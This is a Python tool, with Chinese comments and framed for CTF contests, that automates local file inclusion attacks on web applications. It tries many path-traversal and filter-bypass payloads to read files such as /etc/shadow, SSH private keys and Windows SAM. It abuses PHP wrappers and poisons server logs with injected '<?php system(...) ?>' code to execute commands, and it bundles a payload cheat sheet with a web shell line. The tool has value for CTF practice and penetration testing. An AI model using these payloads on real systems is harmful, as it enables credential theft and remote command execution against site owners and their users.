#!/usr/bin/env python3
"""
CTF 文件包含漏洞检测与利用工具 (web_lfi_toolkit.py)
====================================================
自动检测 LFI（本地/远程文件包含）漏洞并尝试利用：
1. 检测阶段：注入已知文件路径，判断是否存在 LFI
2. 绕过过滤：自动尝试多种编码和路径绕过方式
3. 利用阶段：读取敏感文件、日志投毒、PHP 伪协议利用

核心依赖: requests

使用方式:
  # 自动检测
  python web_lfi_toolkit.py -u "http://target/page?file=test" --param file

  # 读取指定文件
  python web_lfi_toolkit.py -u "http://target/page?file=test" --param file --read /etc/passwd

  # PHP 伪协议利用
  python web_lfi_toolkit.py -u "http://target/page?file=test" --param file --php-filter

  # 日志投毒
  python web_lfi_toolkit.py -u "http://target/page?file=test" --param file --log-poison --log-path /var/log/nginx/access.log

比赛时替换 URL 和参数名即可。
"""

import argparse
import base64
import sys
import re

try:
    import requests
except ImportError:
    print("[!]\u9700\u8981\u5b89\u88c5 requests: pip install requests")
    sys.exit(1)

# ============================================================
# 常见敏感文件路径
# ============================================================

SENSITIVE_FILES = {
    'linux': [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/etc/hostname',
        '/etc/resolv.conf',
        '/etc/nginx/nginx.conf',
        '/etc/nginx/sites-enabled/default',
        '/etc/apache2/apache2.conf',
        '/etc/apache2/httpd.conf',
        '/etc/httpd/conf/httpd.conf',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/auth.log',
        '/var/log/syslog',
        '/proc/self/environ',
        '/proc/self/cmdline',
        '/proc/self/status',
        '/proc/version',
        '/proc/cpuinfo',
        '/root/.bash_history',
        '/root/.ssh/id_rsa',
        '/home/flag',
        '/flag',
        '/flag.txt',
        '/tmp/flag',
    ],
    'windows': [
        'C:\\\\Windows\\\\win.ini',
        'C:\\\\Windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
        'C:\\\\Windows\\\\system32\\\\config\\\\SAM',
        'C:\\\\Windows\\\\repair\\\\SAM',
        'C:\\\\Windows\\\\php.ini',
        'C:\\\\Windows\\\\system.in',
        'C:\\\\inetpub\\\\wwwroot\\\\web.config',
        'C:\\\\xampp\\\\apache\\\\conf\\\\httpd.conf',
        'C:\\\\xampp\\\\php\\\\php.ini',
        'C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt',
    ],
}

# ============================================================
# 绕过技巧
# ============================================================

BYPASS_TECHNIQUES = [
    # 直接路径
    ('直接', lambda p: p),
    # ../ 重复
    ('../ 重复(8层)', lambda p: '../' * 8 + p.lstrip('/')),
    ('../ 重复(16层)', lambda p: '../' * 16 + p.lstrip('/')),
    # 双写绕过
    ('....// 双写绕过', lambda p: p.replace('../', '....//')),
    # URL 编码
    ('URL编码(.../)', lambda p: p.replace('../', '..%2f')),
    ('URL编码(完整)', lambda p: re.sub(r'([./])', lambda m: f'%{ord(m.group(1)):02x}', p)),
    # 双重 URL 编码
    ('双重URL编码', lambda p: re.sub(r'([./])', lambda m: f'%25{ord(m.group(1)):02x}', p)),
    # ..././ 绕过
    ('..././ 绕过', lambda p: p.replace('../', '..././')),
    # 空字节截断 (PHP < 5.3)
    ('空字节截断', lambda p: p + '%00'),
    # 路径截断 (PHP < 5.3)
    ('路径截断(./)', lambda p: p + '/.' * 200),
    # 反斜杠
    ('反斜杠绕过', lambda p: p.replace('/', '\\\\')),
    # PHP 伪协议
    ('php://filter', lambda p: f'php://filter/read=convert.base64-encode/resource={p}'),
    ('php://filter(rot13)', lambda p: f'php://filter/read=string.rot13/resource={p}'),
    ('php://input', lambda p: 'php://input'),
    ('data://', lambda p: f'data://text/plain;base64,{base64.b64encode(p.encode()).decode()}'),
    ('file://', lambda p: f'file://{p}'),
    # PHP 伪协议 - convert.iconv
    ('php://filter(iconv)', lambda p: f'php://filter/convert.iconv.utf-8.utf-16/resource={p}'),
]

# ============================================================
# 检测器
# ============================================================

class LFIDetector:
    """LFI 检测与利用"""

    def __init__(self, url, param, method='GET', data=None,
                 cookies=None, headers=None, timeout=10, proxy=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        if cookies:
            self.session.headers['Cookie'] = cookies
        if headers:
            self.session.headers.update(headers)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        # 基准响应
        self.baseline = self._get_baseline()

    def _get_baseline(self):
        """获取基准响应"""
        text = self.send_payload('not_exist_file_xyz')
        return text or ''

    def send_payload(self, payload):
        """发送 payload"""
        params = {}
        data = {}

        if self.method == 'GET':
            params[self.param] = payload
        else:
            data[self.param] = payload

        data.update(self.data)

        try:
            if self.method == 'GET':
                resp = self.session.get(self.url, params=params, timeout=self.timeout)
            else:
                resp = self.session.post(self.url, data=data, timeout=self.timeout)
            return resp.text
        except requests.RequestException as e:
            return None

    def _is_found(self, text, markers):
        """判断是否成功读取到文件"""
        if not text:
            return False
        for marker in markers:
            if marker in text:
                return True
        return False

    def detect(self):
        """自动检测 LFI"""
        print("[*] \u5f00\u59cb LFI \u68c0\u6d4b...")

        found = False

        # Linux: 尝试 /etc/passwd
        for tech_name, tech_func in BYPASS_TECHNIQUES[:8]:
            payload = tech_func('/etc/passwd')
            print(f"  [*] \u5c1d\u8bd5: {tech_name} → {payload[:60]}")
            text = self.send_payload(payload)
            if text and self._is_found(text, ['root:', 'daemon:', 'bin:', '/bin/']):
                print(f"  [+] \u68c0\u6d4b\u5230 LFI! \u6280\u5de7: {tech_name}")
                print(f"  [+] /etc/passwd \u5185\u5bb9:")
                print(f"  {text[:500]}")
                found = True
                break

        if not found:
            # Windows: 尝试 win.ini
            for tech_name, tech_func in BYPASS_TECHNIQUES[:8]:
                payload = tech_func('C:\\\\Windows\\\\win.ini')
                print(f"  [*] \u5c1d\u8bd5(Windows): {tech_name} → {payload[:60]}")
                text = self.send_payload(payload)
                if text and self._is_found(text, ['[fonts]', '[extensions]', 'for 16-bit']):
                    print(f"  [+] \u68c0\u6d4b\u5230 LFI! \u6280\u5de7: {tech_name}")
                    print(f"  [+] win.ini \u5185\u5bb9:")
                    print(f"  {text[:500]}")
                    found = True
                    break

        if not found:
            print("[-] \u672a\u68c0\u6d4b\u5230 LFI\uff0c\u5c1d\u8bd5\u624b\u52a8\u6307\u5b9a\u6587\u4ef6\u8def\u5f84")
            return False

        return True

    def read_file(self, filepath, bypass=None):
        """
        读取文件，自动尝试多种绕过方式。
        bypass: 指定绕过方式名，None 则全部尝试。
        """
        print(f"\n[*] \u8bfb\u53d6\u6587\u4ef6: {filepath}")

        if bypass:
            # 使用指定绕过方式
            for tech_name, tech_func in BYPASS_TECHNIQUES:
                if tech_name == bypass:
                    payload = tech_func(filepath)
                    print(f"  [*] \u6280\u5de7: {tech_name}, payload: {payload[:80]}")
                    text = self.send_payload(payload)
                    if text and text != self.baseline:
                        # 尝试 base64 解码（php://filter 返回 base64）
                        if 'base64' in payload:
                            decoded = self._try_b64_decode(text)
                            if decoded:
                                print(f"  [+] \u89e3\u7801\u540e\u5185\u5bb9:")
                                print(f"  {decoded[:500]}")
                                return decoded
                        print(f"  [+] \u5185\u5bb9:")
                        print(f"  {text[:500]}")
                        return text
                    print("  [-] \u5931\u8d25")
                    return None

        # 全部尝试
        for tech_name, tech_func in BYPASS_TECHNIQUES:
            payload = tech_func(filepath)
            print(f"  [*] {tech_name}: {payload[:80]}")
            text = self.send_payload(payload)
            if text and text != self.baseline:
                # 检查是否包含常见文件内容标记
                if any(marker in text for marker in ['root:', '[fonts]', '{', '<?', '#', '<', 'flag{', 'FLAG{']):
                    # base64 解码
                    if 'base64' in payload:
                        decoded = self._try_b64_decode(text)
                        if decoded and decoded != text:
                            print(f"  [+] \u6210\u529f! ({tech_name}) base64 \u89e3\u7801:")
                            print(f"  {decoded[:500]}")
                            return decoded
                    print(f"  [+] \u6210\u529f! ({tech_name})")
                    print(f"  {text[:500]}")
                    return text

        print("  [-] \u6240\u6709\u7ed5\u8fc7\u65b9\u5f0f\u5747\u5931\u8d25")
        return None

    def php_filter_exploit(self, filepath):
        """PHP filter 伪协议利用"""
        print(f"\n[*] PHP filter \u4f2a\u534f\u8bae\u5229\u7528: {filepath}")

        # base64 编码读取
        payload = f'php://filter/read=convert.base64-encode/resource={filepath}'
        print(f"  [*] payload: {payload}")
        text = self.send_payload(payload)
        if text and text != self.baseline:
            decoded = self._try_b64_decode(text)
            if decoded:
                print(f"  [+] base64 \u89e3\u7801\u5185\u5bb9:")
                print(decoded[:1000])
                return decoded

        # rot13 读取
        payload = f'php://filter/read=string.rot13/resource={filepath}'
        print(f"  [*] rot13 payload: {payload}")
        text = self.send_payload(payload)
        if text and text != self.baseline:
            # rot13 解码
            import codecs
            decoded = codecs.decode(text.strip(), 'rot_13')
            print(f"  [+] rot13 \u89e3\u7801\u5185\u5bb9:")
            print(decoded[:1000])
            return decoded

        print("  [-] PHP filter \u5229\u7528\u5931\u8d25")
        return None

    def php_input_exploit(self, cmd):
        """
        php://input 伪协议利用。
        需要配合 POST body 发送 PHP 代码。
        """
        print(f"\n[*] php://input \u4f2a\u534f\u8bae\u5229\u7528")
        print(f"  [*] \u6267\u884c\u547d\u4ee4: {cmd}")

        payload = 'php://input'
        php_code = f'<?php system("{cmd}"); ?>'

        params = {}
        data = {}

        if self.method == 'GET':
            params[self.param] = payload
        else:
            data[self.param] = payload

        data.update(self.data)
        data['php_input_body'] = php_code

        try:
            if self.method == 'GET':
                # php://input 需要将 PHP 代码放在 POST body
                resp = self.session.post(
                    self.url,
                    params=params,
                    data=php_code,
                    timeout=self.timeout,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
            else:
                resp = self.session.post(
                    self.url,
                    data={self.param: payload},
                    timeout=self.timeout,
                )

            if resp and resp.text != self.baseline:
                print(f"  [+] \u54cd\u5e94\u5185\u5bb9:")
                print(f"  {resp.text[:500]}")
                return resp.text
        except Exception as e:
            print(f"  [!] \u8bf7\u6c42\u5931\u8d25: {e}")

        print("  [-] php://input \u5229\u7528\u5931\u8d25")
        return None

    def data_uri_exploit(self, php_code):
        """
        data:// 伪协议利用。
        需要 allow_url_include=On
        """
        print(f"\n[*] data:// \u4f2a\u534f\u8bae\u5229\u7528")
        print(f"  [*] PHP \u4ee3\u7801: {php_code}")

        b64 = base64.b64encode(php_code.encode()).decode()
        payload = f'data://text/plain;base64,{b64}'

        text = self.send_payload(payload)
        if text and text != self.baseline:
            print(f"  [+] \u54cd\u5e94\u5185\u5bb9:")
            print(f"  {text[:500]}")
            return text

        print("  [-] data:// \u5229\u7528\u5931\u8d25")
        return None

    def log_poison(self, log_path, cmd, ua_payload=None):
        """
        日志投毒利用。
        将 PHP 代码写入日志，然后通过 LFI 包含日志执行。
        """
        print(f"\n[*] \u65e5\u5fd7\u6295\u6bd2\u5229\u7528")
        print(f"  [*] \u65e5\u5fd7\u8def\u5f84: {log_path}")
        print(f"  [*] \u6267\u884c\u547d\u4ee4: {cmd}")

        # Step 1: 投毒 — 在 User-Agent 中注入 PHP 代码
        poison_code = f'<?php system("{cmd}"); ?>'
        print(f"  [*] \u6295\u6bd2 payload (User-Agent): {poison_code}")

        self.session.headers['User-Agent'] = poison_code
        # 请求首页触发日志记录
        try:
            self.session.get(self.url.split('?')[0], timeout=self.timeout)
            print(f"  [+] \u6295\u6bd2\u5b8c\u6210\uff0c\u5df2\u8bf7\u6c42\u9996\u9875\u89e6\u53d1\u65e5\u5fd7\u8bb0\u5f55")
        except:
            pass

        # Step 2: 包含日志
        print(f"  [*] \u5305\u542b\u65e5\u5fd7: {log_path}")
        text = self.send_payload(log_path)

        # 恢复 UA
        self.session.headers['User-Agent'] = 'Mozilla/5.0'

        if text and text != self.baseline:
            print(f"  [+] \u65e5\u5fd7\u5185\u5bb9:")
            # 查找命令执行输出（通常在 PHP 代码后面）
            lines = text.split('\n')
            for line in lines:
                if poison_code in line:
                    # PHP 执行后输出会跟在后面
                    idx = lines.index(line)
                    output = '\n'.join(lines[idx:])
                    print(f"  {output[:500]}")
                    return output
            print(f"  {text[:500]}")
            return text

        print("  [-] \u65e5\u5fd7\u6295\u6bd2\u5931\u8d25")
        return None

    def _try_b64_decode(self, text):
        """尝试 base64 解码"""
        # 提取可能的 base64 字符串
        text = text.strip()
        # 移除 HTML 标签
        text = re.sub(r'<[^>]+>', '', text)

        try:
            # 尝试直接解码
            return base64.b64decode(text).decode('utf-8', errors='replace')
        except:
            pass

        # 尝试提取 base64 部分
        b64_pattern = re.findall(r'[A-Za-z0-9+/=]{20,}', text)
        for b64_str in b64_pattern:
            try:
                decoded = base64.b64decode(b64_str).decode('utf-8', errors='replace')
                if decoded and any(c.isprintable() for c in decoded):
                    return decoded
            except:
                pass

        return None

    def scan_sensitive_files(self, os_type='linux'):
        """批量扫描敏感文件"""
        print(f"\n[*] \u6279\u91cf\u626b\u63cf\u654f\u611f\u6587\u4ef6 (OS: {os_type})")
        print(f"{'='*60}")

        files = SENSITIVE_FILES.get(os_type, SENSITIVE_FILES['linux'])

        for filepath in files:
            print(f"\n  [*] \u5c1d\u8bd5: {filepath}")
            result = self.read_file(filepath)
            if result:
                print(f"  [+] \u6210\u529f\u8bfb\u53d6: {filepath}")
            # 恢复 UA（日志投毒可能改了）
            self.session.headers['User-Agent'] = 'Mozilla/5.0'


# ============================================================
# LFI Payload 速查表
# ============================================================

LFI_CHEATSHEET = """
============================================================
LFI 文件包含 Payload 速查表
============================================================

【1. 基本路径遍历】
  ../../../etc/passwd
  ..\\..\\..\\windows\\win.ini

【2. 绕过 ../ 过滤】
  双写:    ....//....//....//etc/passwd
  编码:    ..%2f..%2f..%2fetc/passwd
  双重编码: %252e%252e%252f → ../
  ..././: ..././..././..././etc/passwd
  反斜杠: ..\\..\\..\\etc/passwd

【3. PHP 伪协议】
  base64读取: php://filter/read=convert.base64-encode/resource=index.php
  rot13读取:  php://filter/read=string.rot13/resource=index.php
  字符串翻转: php://filter/read=string.toupper/resource=index.php
  
  php://input (POST body 放 PHP 代码):
    GET ?file=php://input
    POST: <?php system('id'); ?>
  
  data:// (需要 allow_url_include=On):
    data://text/plain,<?php system('id');?>
    data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

  phar:// (反序列化利用):
    phar://upload/shell.phar

【4. 日志投毒】
  Nginx:  /var/log/nginx/access.log
  Apache: /var/log/apache2/access.log
  
  步骤:
    1. 在 User-Agent 中注入: <?php system($_GET['cmd']); ?>
    2. 访问首页触发日志记录
    3. LFI 包含日志文件: ?file=/var/log/nginx/access.log

【5. /proc 利用】
  当前进程环境变量: /proc/self/environ
  当前进程命令行: /proc/self/cmdline
  当前进程状态: /proc/self/status
  文件描述符: /proc/self/fd/0-9

【6. 截断技巧 (PHP < 5.3)】
  空字节截断: ../../etc/passwd%00
  路径截断:   ../../etc/passwd/./././.[重复200+]

【7. Windows 敏感文件】
  C:\\Windows\\win.ini
  C:\\Windows\\system32\\drivers\\etc\\hosts
  C:\\Windows\\system32\\config\\SAM
  C:\\inetpub\\wwwroot\\web.config

============================================================
"""


# ============================================================
# 命令行入口
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description='CTF \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u68c0\u6d4b\u4e0e\u5229\u7528\u5de5\u5177',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
\u793a\u4f8b:
  # \u81ea\u52a8\u68c0\u6d4b
  python web_lfi_toolkit.py -u "http://target/page?file=test" --param file

  # \u8bfb\u53d6\u6307\u5b9a\u6587\u4ef6
  python web_lfi_toolkit.py -u "http://target/page?file=test" --param file --read /etc/passwd

  # PHP filter \u4f2a\u534f\u8bae
  python web_lfi_toolkit.py -u "http://target/page?file=test" --param file --php-filter --read /var/www/html/index.php

  # \u6279\u91cf\u626b\u63cf\u654f\u611f\u6587\u4ef6
  python web_lfi_toolkit.py -u "http://target/page?file=test" --param file --scan linux

  # \u65e5\u5fd7\u6295\u6bd2
  python web_lfi_toolkit.py -u "http://target/page?file=test" --param file --log-poison --log-path /var/log/nginx/access.log --cmd id

  # \u67e5\u770b payload \u901f\u67e5\u8868
  python web_lfi_toolkit.py cheatsheet
        """
    )

    parser.add_argument('-u', '--url', help='\u76ee\u6807 URL')
    parser.add_argument('--param', help='\u6ce8\u5165\u53c2\u6570\u540d')
    parser.add_argument('--method', default='GET', help='HTTP \u65b9\u6cd5 (GET/POST)')
    parser.add_argument('--data', help='POST \u6570\u636e (key=value&key2=value2)')
    parser.add_argument('--cookies', help='Cookie \u5b57\u7b26\u4e32')
    parser.add_argument('--timeout', type=int, default=10, help='\u8bf7\u6c42\u8d85\u65f6 (\u79d2)')
    parser.add_argument('--proxy', help='HTTP \u4ee3\u7406')

    parser.add_argument('--read', help='\u8bfb\u53d6\u6307\u5b9a\u6587\u4ef6')
    parser.add_argument('--php-filter', action='store_true', help='\u4f7f\u7528 PHP filter \u4f2a\u534f\u8bae')
    parser.add_argument('--php-input', help='php://input \u5229\u7528 (\u6307\u5b9a\u547d\u4ee4)')
    parser.add_argument('--data-uri', help='data:// \u4f2a\u534f\u8bae\u5229\u7528 (\u6307\u5b9a PHP \u4ee3\u7801)')
    parser.add_argument('--log-poison', action='store_true', help='\u65e5\u5fd7\u6295\u6bd2')
    parser.add_argument('--log-path', default='/var/log/nginx/access.log', help='\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84')
    parser.add_argument('--cmd', default='id', help='\u8981\u6267\u884c\u7684\u547d\u4ee4')
    parser.add_argument('--scan', choices=['linux', 'windows'], help='\u6279\u91cf\u626b\u63cf\u654f\u611f\u6587\u4ef6')

    args = parser.parse_args()

    if 'cheatsheet' in sys.argv:
        print(LFI_CHEATSHEET)
        return

    if not args.url or not args.param:
        if not args.url:
            parser.print_help()
            return

    # 解析 POST data
    data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                data[k] = v

    detector = LFIDetector(
        url=args.url,
        param=args.param,
        method=args.method,
        data=data,
        cookies=args.cookies,
        timeout=args.timeout,
        proxy=args.proxy,
    )

    if args.scan:
        # 批量扫描
        detector.scan_sensitive_files(args.scan)
    elif args.log_poison:
        # 日志投毒
        detector.log_poison(args.log_path, args.cmd)
    elif args.php_filter and args.read:
        # PHP filter
        detector.php_filter_exploit(args.read)
    elif args.php_input:
        # php://input
        detector.php_input_exploit(args.php_input)
    elif args.data_uri:
        # data://
        detector.data_uri_exploit(args.data_uri)
    elif args.read:
        # 读取文件
        detector.read_file(args.read)
    else:
        # 自动检测
        detector.detect()


if __name__ == '__main__':
    main()
